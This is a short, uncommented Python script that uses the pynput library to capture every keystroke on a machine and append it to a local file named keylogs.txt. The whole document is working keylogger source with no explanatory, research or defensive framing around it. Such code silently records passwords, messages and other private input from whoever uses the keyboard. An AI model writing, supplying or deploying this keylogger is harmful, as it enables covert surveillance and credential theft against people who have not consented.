```python
from pynput import keyboard
import os

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(str(key))
    except Exception as e:
        print("Error occurred:", str(e))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```